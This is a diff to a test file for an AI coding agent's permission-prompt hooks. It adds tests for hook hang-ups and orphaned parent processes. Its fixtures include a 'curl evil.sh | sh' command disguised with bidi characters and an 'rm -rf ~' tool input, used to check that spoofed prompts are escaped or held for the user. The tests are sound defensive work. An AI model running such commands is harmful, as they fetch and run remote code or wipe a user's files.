@@ -7,7 +7,13 @@ import { AgentClient } from "../src/agent/client";
 import { makeAgent } from "../src/agent/main";
 import type { Agent } from "../src/agent/server";
 import { run } from "../src/cli";
-import { ASK_USER_REASON, hookAskUser, hookPermission, hookSettle } from "../src/hook";
+import {
+  ASK_USER_REASON,
+  hookAskUser,
+  hookPermission,
+  hookSettle,
+  untilOrphaned,
+} from "../src/hook";
 import {
   buildPermission,
   DENIED,
@@ -330,6 +336,43 @@ test("SIGTERM (Esc or No at the keyboard) reports the prompt settled and prints 
   });
 });
 
+test("a hook that hangs up and does not hold again is gone: the prompt settles at the keyboard (#400)", async () => {
+  const ctx = await machine();
+  const agent = new AgentClient(join(ctx.store.dir, "agent.sock"));
+  const { id } = await agent.call<{ id: string }>(
+    "POST",
+    "/v1/permissions",
+    {
+      hook: JSON.parse(request()),
+      agent: "opencode",
+      source: { project: "starbridge", session: "ses_1" },
+      waitMs: 60_000,
+    },
+    10_000,
+  );
+  const hold = async (ms: number) => {
+    const hangUp = AbortSignal.timeout(ms);
+    await agent
+      .call("POST", `/v1/permissions/${id}/wait`, { wait: 20 }, 25_000, hangUp)
+      .catch(() => {});
+  };
+  // Hung up, then held again at once: still the hook's.
+  await hold(300);
+  await hold(6_000);
+  expect(await server.opened("settled")).toEqual([]);
+  await until(async () => (await server.opened("settled")).length === 1, 10_000);
+  expect((await server.opened("settled"))[0]).toMatchObject({ itemId: id, outcome: "keyboard" });
+});
+
+test("a hook whose parent is gone stops waiting", async () => {
+  let ppid = 42;
+  const watch = untilOrphaned(undefined, () => ppid);
+  expect(watch.signal.aborted).toBe(false);
+  ppid = 1;
+  await until(async () => watch.signal.aborted, 5_000);
+  watch.stop();
+});
+
 test("while disabled the hooks post nothing and print nothing", async () => {
   const ctx = await machine();
   expect(await run(["config", "permissions", "off"], ctx)).toBe(0);
@@ -493,6 +536,9 @@ test("bidi and invisible characters reach devices as escapes (#357)", () => {
   for (const text of shown) expect(text).not.toMatch(/[​‮⁦⁩]/);
   expect(p.summary).toBe("ls #\\u202E\\u2066 tsil\\u2069\\u2066 ; curl evil.sh | sh\\u2069");
   expect(p.suggestions[0]?.rule).toBe("Bash(ls\\u202E:*)");
+  // Redacted, two keys holding different tokens would read alike and show one value for both (#410).
+  const [a, b] = ["sk-ant-api03-aaaaaaaaaaaaaaaaaaaaaaaa", "sk-ant-api03-bbbbbbbbbbbbbbbbbbbbbbbb"];
+  expect(() => build("mcp__x__y", { [a]: "rm -rf ~", [b]: "ls" })).toThrow("stays at the keyboard");
   // Escaped, these two keys would read alike and show one value for both.
   expect(() => build("mcp__x__y", { "x\u202E": "rm -rf ~", "x\\u202E": "ls" })).toThrow(
     "stays at the keyboard",
